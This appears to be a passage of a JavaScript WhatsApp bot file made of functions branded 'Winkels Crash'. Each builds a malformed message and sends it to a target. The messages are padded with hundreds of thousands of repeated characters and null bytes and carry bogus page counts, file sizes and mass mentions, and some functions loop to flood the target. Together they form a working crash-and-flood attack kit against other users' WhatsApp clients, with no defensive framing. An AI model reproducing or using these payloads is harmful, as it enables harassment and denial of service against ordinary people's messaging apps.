				 groupMention: [{ groupJid: "0@s.whatsapp.net", groupSubject: "𝖂𝖎𝖓𝖐𝖊𝖑𝖘 𝕮𝖗𝖆𝖘𝖍" }]
				}
				}
				}
				}
				}, { 
					participant: { 
						jid: target, 
						quoted: TypeNull 
					}, 
					fromMe: false 
				}, { 
					messageId: null,
					fromMe: false 
				});
				console.log(chalk.red("Bug Sending By 𝖂𝖎𝖓𝖐𝖊𝖑𝖘 𝕮𝖗𝖆𝖘𝖍"));
				}
				
				async function xwinkelfr3(target) {
				try {
				var atc = generateWAMessageFromContent(target, proto.Message.fromObject({
				viewOnceMessage: {
				message: {
				"productMessage": {
				"product": {
				"productImage": {
				"url": "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m237/up-oil-image-6a66c589-1ed7-4831-9ff7-a537aeec42e5?ccb=9-4&oh=01_Q5AaIO-QEENiH3ITkuP8eDd60OuxvNiUaeZsPjnEfSNbf_lx&oe=6761488D&_nc_sid=e6ed6c&mms3=true",
				"mimetype": "image/jpeg",
				"fileSha256": "4euJQxdTEpk2NS0R7QK6MjGhcix+h1Evxcrrmj1u9nM=",
				"fileLength": "9900090",
				"height": 735,
				"width": 735,
				"mediaKey": "e/5eEYHPLtzZAXLn9cBR8M3+w0bvdFsBvoSf9EPy75w=",
				"fileEncSha256": "/UO6fl07VoTDsXv1W9zqYAS+pBUz6HVokpl4r84LuOg=",
				"directPath": "/o1/v/t62.7118-24/f1/m237/up-oil-image-6a66c589-1ed7-4831-9ff7-a537aeec42e5?ccb=9-4&oh=01_Q5AaIO-QEENiH3ITkuP8eDd60OuxvNiUaeZsPjnEfSNbf_lx&oe=6761488D&_nc_sid=e6ed6c",
				"mediaKeyTimestamp": "1731847042",
				"jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEIAQwMBIgACEQEDEQH/xAAuAAACAwEBAAAAAAAAAAAAAAAABQIDBAYBAQEBAQAAAAAAAAAAAAAAAAAAAQL/2gAMAwEAAhADEAAAAIRZQzqneSimyUheTzUwLiVG35hjcuoVQl3UxzluBhzlPDmixpBgwhI/SYDq16bSbqWvi8cSLnQ6S0nXcpR6vnU8xYjpLRMiTDVnA9zgWSArAoAP/8QAKBAAAgICAQMEAgIDAAAAAAAAAQIAAwQRIRITMQUQIkEycVFhFDOC/9oACAEBAAE/ADUVZCfszKQJlLMfEN1netgVajY7foR0ZuFJ2pBhSp1IYfsR6Atb1HwOQZVZ1Ig1swYqP8mPMd1D/JfBj09/KVmGlCy4uCAvgCPqxV3/AESISEvH8MJZWGeKLGNiNyVmHcS/aZOQZ/w0zcjqv2p2BMQmxA7ER2VbOYVb/I2D8SstQMv9jxAXLBG8geRP9JZ2PkTEYJfa7EfzF9VrmyTuYWYKyEbxMn8VK66m55iWMSCy/ICO9mlIHiO94YOAJe69oIfyaXBqXKBtn79kwnso7qGJi7AcMImR1N2rn/RlKV9tSpBiHq6t+NzLupqO0O3mGnW/ctbbGZ+GoJZPuFG3MK0PT2g2juDDpVuqepUIoBRJVkXUaZH4j519nltCYVLWt1dHVqCis6PRphMlqRUxtjuCza8bgJU9Q4mL6khXpuOmhei9CvWpBmQnasZN8AwCYlmPRjL8xLvWEHFaS6625iWY+zgbbXiEbnU48EiFt+YvPE5EbmIeRuMNkyvmtov5xwNt7LG8T6g9v//EABkRAAIDAQAAAAAAAAAAAAAAABEwAAEQIP/aAAgBAgEBPwBI0cCWj//EABkRAAIDAQAAAAAAAAAAAAAAAAARARAgMP/aAAgBAwEBPwDLuRip4ZHD/9k="
				},
				"productId": "28364464939807272",
				"title": "𝖂𝖎𝖓𝖐𝖊𝖑𝖘 𝕮𝖗𝖆𝖘𝖍" + "ꦾ".repeat(90000),
				"description": "𝖂𝖎𝖓𝖐𝖊𝖑𝖘 𝕮𝖗𝖆𝖘𝖍" + "ꦾ".repeat(90000),
				"currencyCode": "𝖂𝖎𝖓𝖐𝖊𝖑𝖘 𝕮𝖗𝖆𝖘𝖍" + "ꦾ".repeat(90000),
				"priceAmount1000": "999999999999999",
				"productImageCount": 1
				},
				"businessOwnerJid": "0@s.whatsapp.net",
				"contextInfo": {}
				}
				 }
				}
				}), { 
				userJid: target, 
				quoted: TypeNull
				});
				await xwill.relayMessage(target, atc.message, { participant: { jid: target }, messageId: atc.key.id });
				
				} catch (error) {
				console.error("Failed to send message:", error);
				}
				console.log(chalk.red("Bug Sending By 𝖂𝖎𝖓𝖐𝖊𝖑𝖘 𝕮𝖗𝖆𝖘𝖍"));
				}
				
				async function xwinkelfr2(target) {
				try {
				var atc = generateWAMessageFromContent(target, proto.Message.fromObject({
				viewOnceMessage: {
				message: {
				"orderMessage": {
				"orderId": "858780903121585",
				"thumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEIAQwMBIgACEQEDEQH/xAAuAAACAwEBAAAAAAAAAAAAAAAABQIDBAYBAQEBAQAAAAAAAAAAAAAAAAAAAQL/2gAMAwEAAhADEAAAAIRZQzqneSimyUheTzUwLiVG35hjcuoVQl3UxzluBhzlPDmixpBgwhI/SYDq16bSbqWvi8cSLnQ6S0nXcpR6vnU8xYjpLRMiTDVnA9zgWSArAoAP/8QAKBAAAgICAQMEAgIDAAAAAAAAAQIAAwQRIRITMQUQIkEycVFhFDOC/9oACAEBAAE/ADUVZCfszKQJlLMfEN1netgVajY7foR0ZuFJ2pBhSp1IYfsR6Atb1HwOQZVZ1Ig1swYqP8mPMd1D/JfBj09/KVmGlCy4uCAvgCPqxV3/AESISEvH8MJZWGeKLGNiNyVmHcS/aZOQZ/w0zcjqv2p2BMQmxA7ER2VbOYVb/I2D8SstQMv9jxAXLBG8geRP9JZ2PkTEYJfa7EfzF9VrmyTuYWYKyEbxMn8VK66m55iWMSCy/ICO9mlIHiO94YOAJe69oIfyaXBqXKBtn79kwnso7qGJi7AcMImR1N2rn/RlKV9tSpBiHq6t+NzLupqO0O3mGnW/ctbbGZ+GoJZPuFG3MK0PT2g2juDDpVuqepUIoBRJVkXUaZH4j519nltCYVLWt1dHVqCis6PRphMlqRUxtjuCza8bgJU9Q4mL6khXpuOmhei9CvWpBmQnasZN8AwCYlmPRjL8xLvWEHFaS6625iWY+zgbbXiEbnU48EiFt+YvPE5EbmIeRuMNkyvmtov5xwNt7LG8T6g9v//EABkRAAIDAQAAAAAAAAAAAAAAABEwAAEQIP/aAAgBAgEBPwBI0cCWj//EABkRAAIDAQAAAAAAAAAAAAAAAAARARAgMP/aAAgBAwEBPwDLuRip4ZHD/9k=",
				"itemCount": 999,
				"status": "INQUIRY",
				"surface": "CATALOG",
				"message": "𝖂𝖎𝖓𝖐𝖊𝖑𝖘 𝕮𝖗𝖆𝖘𝖍" + "ꦾ".repeat(80000) + "\u0000".repeat(20000) + "ꦾ".repeat(10000),
				"orderTitle": "𝖂𝖎𝖓𝖐𝖊𝖑𝖘 𝕮𝖗𝖆𝖘𝖍" + "ꦾ".repeat(80000),
				"sellerJid": "1@s.whatsapp.net",
				"token": "AR40Ho4Qyc3LSwiWLEdJ9jiBEUzyJxN5FyURQjkwthSOfA==",
				"totalAmount1000": "98999999999999999",
				"totalCurrencyCode": "IDR",
				"messageVersion": 2,
				"contextInfo": {}
				}
				}
				}
				}), { 
				userJid: target, 
				quoted: TypeNull
				});
				await xwill.relayMessage(target, atc.message, { participant: { jid: target }, messageId: atc.key.id });
				
				} catch (error) {
				console.error("Failed to send message:", error);
				}
				console.log(chalk.red("Bug Sending By 𝖂𝖎𝖓𝖐𝖊𝖑𝖘 𝕮𝖗𝖆𝖘𝖍"));
				}
				
				
				async function newgalaxy(target) {
					await xwill.relayMessage(target, {
						viewOnceMessage: {
							message: {
								interactiveResponseMessage: {
									body: {
										text: "𝖂𝖎𝖓𝖐𝖊𝖑𝖘 𝕮𝖗𝖆𝖘𝖍?",
										format: "EXTENSIONS_1"
									},
									nativeFlowResponseMessage: {
										name: 'galaxy_message',
										paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"KUDELs GANTENG\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"kudeltest@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0000".repeat(1020000)}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
										version: 3
									}
								}
							}
						}
					}, { 
						participant: { 
							jid: target, 
							quoted: TypeNull 
						}, 
						fromMe: false 
					}, { 
						messageId: null,
						fromMe: false 
					});
					console.log(chalk.red("Bug Sending By 𝖂𝖎𝖓𝖐𝖊𝖑𝖘 𝕮𝖗𝖆𝖘𝖍"));
				}
						
				async function LocatiOn(target, wanted) {
				let virtex = "𝖂𝖎𝖓𝖐𝖊𝖑𝖘 𝕮𝖗𝖆𝖘𝖍\n\n"+"ꦾ".repeat(77777) + "@1".repeat(77777);
				var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
				viewOnceMessage: {
				message: {
				  "liveLocationMessage": {
					"degreesLatitude": "p",
					"degreesLongitude": "p",
					"caption": virtex,
					"sequenceNumber": "0",
					"jpegThumbnail": ""
					 },
					 body: {
					 text: virtex
					 },
					 nativeFlowMessage: {},
					 contextInfo: {
					 mentionedJid: ["62895351855189@s.whatsapp.net"],
					 groupMentions: [{ groupJid: "1@newsletter", groupSubject: virtex }]
					 }
				  }
				}
				}), { 
					userJid: target, 
					quoted: wanted 
				});
				await xwill.relayMessage(target, etc.message, { 
					participant: { 
						jid: target 
					}, 
					fromMe: false,
					messageId: etc.key.id 
				});
				console.log(chalk.red("Bug Sending By 𝖂𝖎𝖓𝖐𝖊𝖑𝖘 𝕮𝖗𝖆𝖘𝖍"));
				}
				
				async function xwinkelfr(target) {
                let mark = "0@s.whatsapp.net"
				let virtex = "ꦾ".repeat(77777) + "@1".repeat(77777);
				await xwill.relayMessage(target, {
								groupMentionedMessage: {
									message: {
										interactiveMessage: {
											header: {
												documentMessage: {
													url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
													mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
													fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
													fileLength: "999999999",
													pageCount: 0x9184e729fff,
													mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
													fileName: "𝖂𝖎𝖓𝖐𝖊𝖑𝖘 𝕮𝖗𝖆𝖘𝖍",
													fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
													directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
													mediaKeyTimestamp: "1715880173",
													contactVcard: true
												},
												hasMediaAttachment: true
											},
											body: {
												text: "𝖂𝖎𝖓𝖐𝖊𝖑𝖘 𝕮𝖗𝖆𝖘𝖍\n\n" + "ြ".repeat(77777) + "@".repeat(199999).split('@').map(() => `@${mark.split('@')[0]}`).join(''),
											},
											nativeFlowMessage: {},
											contextInfo: {
												mentionedJid: [mark],
												groupMentions: [{ groupJid: "500@newsletter", groupSubject: virtex }]
											}
										}
									}
								}
							}, { participant: { jid: target } });
							console.log(chalk.red("Bug Sending By 𝖂𝖎𝖓𝖐𝖊𝖑𝖘 𝕮𝖗𝖆𝖘𝖍"));
					 };
				
				async function BlankScreen(target, Ptcp = false) {
				let virtex = "𝖂𝖎𝖓𝖐𝖊𝖑𝖘 𝕮𝖗𝖆𝖘𝖍\n\n" + "ꦾ".repeat(77777) + "@1".repeat(50000);
							await xwill.relayMessage(target, {
									ephemeralMessage: {
										message: {
											interactiveMessage: {
												header: {
													documentMessage: {
														url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
														mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
														fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
														fileLength: "9999999999999",
														pageCount: 1316134911,
														mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
														fileName: "𝖂𝖎𝖓𝖐𝖊𝖑𝖘 𝕮𝖗𝖆𝖘𝖍",
														fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
														directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
														mediaKeyTimestamp: "1726867151",
														contactVcard: true,
														jpegThumbnail: "https://files.catbox.moe/bri4a7.jpeg",
													},
													hasMediaAttachment: true,
												},
												body: {
													text: virtex,
												},
												nativeFlowMessage: {
												name: "call_permission_request",
												messageParamsJson: "\u0000".repeat(5000),
												},
												contextInfo: {
												mentionedJid: ["62895351855189@s.whatsapp.net"],
													forwardingScore: 1,
													isForwarded: true,
													fromMe: false,
													participant: "0@s.whatsapp.net",
													remoteJid: "status@broadcast",
													quotedMessage: {
														documentMessage: {
															url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
															mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
															fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
															fileLength: "9999999999999",
															pageCount: 1316134911,
															mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
															fileName: "Bokep 18+",
															fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
															directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
															mediaKeyTimestamp: "1724474503",
															contactVcard: true,
															thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
															thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
															thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
															jpegThumbnail: "https://files.catbox.moe/bri4a7.jpeg",
														},
													},
												},
											},
										},
									},
								},
								Ptcp ? {
									participant: {
										jid: target
									}
								} : {}, {
									messageId: null,
									fromMe: false 
								});
							console.log(chalk.red("Bug Sending By 𝖂𝖎𝖓𝖐𝖊𝖑𝖘 𝕮𝖗𝖆𝖘𝖍"));
					   };
				 
				async function SletterCrash(target) {
				let virtex = "𝖂𝖎𝖓𝖐𝖊𝖑𝖘 𝕮𝖗𝖆𝖘𝖍\n\n" + "ꦾ".repeat(77777) + "@1".repeat(77777);
					var messageContent = generateWAMessageFromContent(target, proto.Message.fromObject({
								'viewOnceMessage': {
									'message': {
										"newsletterAdminInviteMessage": {
											"newsletterJid": `1@newsletter`,
											"newsletterName": virtex,
											"jpegThumbnail": "",
											"caption": virtex,
											"inviteExpiration": Date.now() + 1814400000
										},
										contextInfo: {
								  mentionedJid: ["62895351855189@s.whatsapp.net"],
								  groupMentions: [{ groupJid: "1@newsletter", groupSubject: virtex }]
									}
									}
								}
							}), {
								'userJid': target
							});
							await xwill.relayMessage(target, messageContent.message, {
								'participant': {
									'jid': target
								},
								'fromMe': false,
								'messageId': messageContent.key.id
						});
						console.log(chalk.red("Bug Sending By 𝖂𝖎𝖓𝖐𝖊𝖑𝖘 𝕮𝖗𝖆𝖘𝖍"));
				}
				
				async function CallX(target) {
				let virtex = "𝖂𝖎𝖓𝖐𝖊𝖑𝖘 𝕮𝖗𝖆𝖘𝖍\n\n" + "ꦾ".repeat(77777) + "@1".repeat(77777);
				let mentionedJidArray = Array.from({ length: 35000 }, () => 
						"1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
					);
							let etc = generateWAMessageFromContent(
								target,
								proto.Message.fromObject({
									viewOnceMessage: {
										message: {
											scheduledCallCreationMessage: {
												scheduledTimestampMs: Date.now(),
												callType: 2,
												title: virtex
											},
											contextInfo: {
								  mentionedJid: ["62895351855189@s.whatsapp.net"],
								  groupMentions: [{ groupJid: "500@newsletter", groupSubject: virtex }]
									}
										}
									},
								}), {
									'userJid': target
								}
							);
							await xwill.relayMessage(target, etc.message, {
								'participant': {
									'jid': target
								},
								'fromMe': false,
							});
							console.log(chalk.red("Bug Sending By 𝖂𝖎𝖓𝖐𝖊𝖑𝖘 𝕮𝖗𝖆𝖘𝖍"));
						}
    
    async function ClGc(target) {
				await xwill.relayMessage(target, {
					viewOnceMessage: {
						message: {
							interactiveMessage: {
								header: {
									title: "",
									locationMessage: {},
									hasMediaAttachment: true
								},
								body: {
									text: "𝖂𝖎𝖓𝖐𝖊𝖑𝖘 𝕮𝖗𝖆𝖘𝖍" + "\u0000".repeat(900000)
								},
								nativeFlowMessage: {
									messageParamsJson: ""
								},
								carouselMessage: {}
							}
						}
					}
				}, {
					participant: {
						jid: target
					},
					fromMe: false,
				});
				let X = fs.readFileSync('./database/xwinkel/XY.webp')
				await xwill.sendMessage(target, {
					sticker: X
				}, {
					quoted: wanted
				})
                console.log(chalk.red("Bug Sending By 𝖂𝖎𝖓𝖐𝖊𝖑𝖘 𝕮𝖗𝖆𝖘𝖍"));
			}
		
			async function NewsletterZap2(target) {
				var messageContent = generateWAMessageFromContent(target, proto.Message.fromObject({
					'viewOnceMessage': {
						'message': {
							"newsletterAdminInviteMessage": {
								"newsletterJid": `500@newsletter`,
								"newsletterName": "𝖂𝖎𝖓𝖐𝖊𝖑𝖘 𝕮𝖗𝖆𝖘𝖍 𝖁1" + "\u0000".repeat(920000),
								"jpegThumbnail": "",
								"caption": `Sini bang bantu gua jadi admin wkwk`,
								"inviteExpiration": Date.now() + 1814400000
							}
						}
					}
				}), {
					'userJid': target,
					'fromMe': false,
				});
				await xwill.relayMessage(target, messageContent.message, {
					'participant': {
						'jid': target
					},
					'messageId': messageContent.key.id
				});
                console.log(chalk.red("Bug Sending By 𝖂𝖎𝖓𝖐𝖊𝖑𝖘 𝕮𝖗𝖆𝖘𝖍"));
			}

			   async function ngeloc(target, wanted) {
				var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
				viewOnceMessage: {
				message: {
				  "liveLocationMessage": {
					"degreesLatitude": "p",
					"degreesLongitude": "p",
					"caption": `𝖂𝖎𝖓𝖐𝖊𝖑𝖘 𝕮𝖗𝖆𝖘𝖍`+"ꦾ".repeat(50000),
					"sequenceNumber": "0",
					"jpegThumbnail": ""
					 }
				  }
				}
				}), { userJid: target, quoted: wanted })
				await xwill.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id, fromMe: false });
                console.log(chalk.red("Bug Sending By 𝖂𝖎𝖓𝖐𝖊𝖑𝖘 𝕮𝖗𝖆𝖘𝖍"));
				}
                 
				async function MakanNih(target) {
				let mark = "0@s.whatsapp.net"
				await xwill.relayMessage(target, {
					        groupMentionedMessage: {
					            message: {
					                interactiveMessage: {
					                    header: {
					                        locationMessage: {
					                            degreesLatitude: 0,
					                            degreesLongitude: 0
					                        },
					                        hasMediaAttachment: true
					                    },
					                    body: {
					                        text: "𝖂𝖎𝖓𝖐𝖊𝖑𝖘 𝕮𝖗𝖆𝖘𝖍\n " + "ꦾ".repeat(10000)
					                    },
					                    nativeFlowMessage: {},
										caption: "𝖂𝖎𝖓𝖐𝖊𝖑𝖘 𝕮𝖗𝖆𝖘𝖍\n " + "ꦾ".repeat(10000) + "@".repeat(199999).split('@').map(() => `@${mark.split('@')[0]}`).join(''),
					                    contextInfo: {
					                        mentionedJid: Array.from({ length: 5 }, () => "500@newsletter"),
					                        groupMentions: [{ groupJid: "500@newsletter", 
											groupSubject: " 𝖂𝖎𝖓𝖐𝖊𝖑𝖘 𝕮𝖗𝖆𝖘𝖍 " }]
					                    }
					                }
					            }
					        }
					    }, { participant: { jid: target }, fromMe: false }, { messageId: null });    
                    console.log(chalk.red("Bug Sending By 𝖂𝖎𝖓𝖐𝖊𝖑𝖘 𝕮𝖗𝖆𝖘𝖍"));
					}
                
					async function MatykLu(target){
					let mark = "0@s.whatsapp.net"
					await xwill.relayMessage(target, {
						documentMessage: {
							url: "https://mmg.whatsapp.net/v/t62.7119-24/24017397_502275652492054_7823655190319258764_n.enc?ccb=11-4&oh=01_Q5AaINgEFhnayU4B4J7sLgE79iMLG3IxiAJfqvu8MzOe1-GN&oe=66F4CEAF&_nc_sid=5e03e0&mms3=true",
							mimetype: " ", 
							fileSha256: "S3Vkoa7qmHWfolsGQnBLZX53KxvEzEQpjwpbqiA0Y8U=",
							fileLength: "12",
							pageCount: 99999999999,
							mediaKey: "hsFvNFnuNSiLkqOOdFQEN8OU7Zbc3XBk7cTvoTlj4i0=",
							fileName: "𝖂𝖎𝖓𝖐𝖊𝖑𝖘 𝕮𝖗𝖆𝖘𝖍",
							fileEncSha256: "DQV/eBlg9QQ+eFd0QQN/APBZxcu95B2VWbsR1pHNcD0=",
							directPath: "/v/t62.7119-24/24017397_502275652492054_7823655190319258764_n.enc?ccb=11-4&oh=01_Q5AaINgEFhnayU4B4J7sLgE79iMLG3IxiAJfqvu8MzOe1-GN&oe=66F4CEAF&_nc_sid=5e03e0",
							mediaKeyTimestamp: "1724734289", 
							caption: "*Hola*, 𝖂𝖎𝖓𝖐𝖊𝖑𝖘 𝕮𝖗𝖆𝖘𝖍\n\n" + "ꦾ".repeat(57777) + "@".repeat(199999).split('@').map(() => `@${mark.split('@')[0]}`).join(''),
							contextInfo: {
							mentionedJid: [mark],
							isForwarded: true,
						},
						}
						}, {
						participant: {
							jid: target
						},
						fromMe: false,
					}, {
						messageId: null,
						fromMe: false,
					});
                   console.log(chalk.red("Bug Sending By 𝖂𝖎𝖓𝖐𝖊𝖑𝖘 𝕮𝖗𝖆𝖘𝖍"));
				}
    
		async function Floods3(target) {
			    for (let i = 0; i < 10; i++) {
				xwill.relayMessage(target, {
						groupMentionedMessage: {
						message: {
						interactiveMessage: {
							header: {
								locationMessage: {
									degreesLatitude: 0,
									degreesLongitude: 0
							},
							hasMediaAttachment: true
							},
					body: {
							text: "Hola, Majestic Resolve" + "ꦾ".repeat(120000) + "@1".repeat(250000)
							},
							nativeFlowMessage: {},
							contextInfo: {
							mentionedJid: Array.from({ length: 100 }, () => "1@newsletter"),
							groupMentions: [{ groupJid: "1@newsletter", groupSubject: "xwill" }]
							}
						}
					}
				}
						}, { participant: { jid: target } }, { messageId: null });
						console.log(chalk.red("Bug Sending By 𝖂𝖎𝖓𝖐𝖊𝖑𝖘 𝕮𝖗𝖆𝖘𝖍"));
					}
				};
					
					async function Floods4(target) {
					for (let i = 0; i < 5; i++) {
						
							xwill.relayMessage(target, {
							 groupMentionedMessage: {
							message: {
								interactiveMessage: {
									header: {
										locationMessage: {
											degreesLatitude: 0,
											degreesLongitude: 0
										},
										hasMediaAttachment: true
									},
									body: {
										text: "Hola, Majestic Resolve" + "ꦾ".repeat(120000) + "🔥".repeat(250000)
									},
									nativeFlowMessage: {},
									contextInfo: {
										mentionedJid: Array.from({ length: 100 }, () => "1@newsletter"),
										groupMentions: [{ groupJid: "1@newsletter", groupSubject: "xwill" }]
										}
									}
								}
							}
						}, { participant: { jid: target } }, { messageId: null });
						console.log(chalk.red("Bug Sending By 𝖂𝖎𝖓𝖐𝖊𝖑𝖘 𝕮𝖗𝖆𝖘𝖍"));
					}
				};
				
				
				async function Floods(target) {
					for (let i = 0; i < 5; i++) {
						
					xwill.relayMessage(target, {
						groupMentionedMessage: {
							message: {
								interactiveMessage: {
									header: {
										locationMessage: {
											degreesLatitude: 0,
											degreesLongitude: 0
										},
										hasMediaAttachment: true
									},
									body: {
										text: "Hola, Majestic Resolve" + "ꦾ".repeat(120000) + "🔥".repeat(250000)
									},
									nativeFlowMessage: {},
									contextInfo: {
										mentionedJid: Array.from({ length: 100 }, () => "1@newsletter"),
										groupMentions: [{ groupJid: "1@newsletter", groupSubject: "xwill" }]
										}
									}
								}
							}
						}, { participant: { jid: target } }, { messageId: null });
						console.log(chalk.red("Bug Sending By 𝖂𝖎𝖓𝖐𝖊𝖑𝖘 𝕮𝖗𝖆𝖘𝖍"));
					}
				};
				
				async function xwinkel2(target) {
                    let mark = "0@s.whatsapp.net"
						await xwill.relayMessage(target, {
							groupMentionedMessage: {
								message: {
									interactiveMessage: {
										header: {
											locationMessage: {
												degreesLatitude: 0,
												degreesLongitude: 0
											},
											hasMediaAttachment: true
										},
										body: {
											text: "*Hola*, 𝖂𝖎𝖓𝖐𝖊𝖑𝖘 𝕮𝖗𝖆𝖘𝖍\n\n" + "⚡".repeat(1100) + "ꦾ".repeat(27000) + "@".repeat(199999).split('@').map(() => `@${mark.split('@')[0]}`).join(''),
										},
										nativeFlowMessage: {},
										contextInfo: {
											mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
											groupMentions: [{ groupJid: "1@newsletter", groupSubject: "Kudels - GG" }]
											
										}
									}
								}
								
							}
							
						}, { participant: { jid: target } }, { messageId: null });
                    console.log(chalk.red("Bug Sending By 𝖂𝖎𝖓𝖐𝖊𝖑𝖘 𝕮𝖗𝖆𝖘𝖍"));
					}
					
					
				async function xwinkel1(target) {
                   let mark = "0@s.whatsapp.net"
					xwill.relayMessage(target, {
						groupMentionedMessage: {
							message: {
								interactiveMessage: {
									header: {
										locationMessage: {
											degreesLatitude: 0,
											degreesLongitude: 0
										},
										hasMediaAttachment: true
									},
									body: {
										text: "*Hola*, 𝖂𝖎𝖓𝖐𝖊𝖑𝖘 𝕮𝖗𝖆𝖘𝖍\n\n" + "ꦾ".repeat(57777) + "@1".repeat(25000) + "@".repeat(199999).split('@').map(() => `@${mark.split('@')[0]}`).join(''),
									},
									nativeFlowMessage: {},
									contextInfo: {
										mentionedJid: Array.from({ length: 100 }, () => "1@newsletter"),
										groupMentions: [{ groupJid: "1@newsletter", groupSubject: "Kudels - Ganteng" }]
									}
								}
							}
						}
					}, { participant: { jid: target } }, { messageId: null });
                    console.log(chalk.red("Bug Sending By 𝖂𝖎𝖓𝖐𝖊𝖑𝖘 𝕮𝖗𝖆𝖘𝖍"));
				};
    
    async function BugBETA(target) {
                    await xwill.relayMessage(target, {
                        requestPaymentMessage: {
                            currencyCodeIso4217: "XXX",
                            amount1000: "9999999",
                            noteMessage: {
                                stickerMessage: {
                                    url: "https://mmg.whatsapp.net/v/t62.15575-24/25379495_1233047614391746_7167397995027803975_n.enc?ccb=11-4&oh=01_Q5AaIAD-TDkmUl78ym4RtDRuW8UYO9L-2_eD_nZ4GJ8t4avr&oe=66F0DBAB&_nc_sid=5e03e0&mms3=true",
                                    fileSha256: "AsFkxvyLnK222nsY5s6MhoF4NSKwRg7ViAI5nTcPKUs=",
                                    fileEncSha256: "72VMs7G12NGe7VQ2xJ25sNemjAPsdhITdgyvHgrQmdM=",
                                    mediaKey: "1yHvOqdtF1xEwpPnudsJInh09EBqrJWEZcDma7K6ORo=",
                                    mimetype: "image/webp",
                                    height: 7264,
                                    width: 7264,
                                    directPath: "/v/t62.15575-24/25379495_1233047614391746_7167397995027803975_n.enc?ccb=11-4&oh=01_Q5AaIAD-TDkmUl78ym4RtDRuW8UYO9L-2_eD_nZ4GJ8t4avr&oe=66F0DBAB&_nc_sid=5e03e0",
                                    fileLength: "253140",
                                    mediaKeyTimestamp: "1724474267",
                                    firstFrameLength: 15246,
                                    firstFrameSidecar: "N4MITqGgH587+A==",
                                    isAnimated: true,
                                    contextInfo: {
                                        isForwarded: true,
                                        fromMe: false,
                                        participant: "0@s.whatsapp.net",
                                        remoteJid: "target",
                                        quotedMessage: {
                                            documentMessage: {
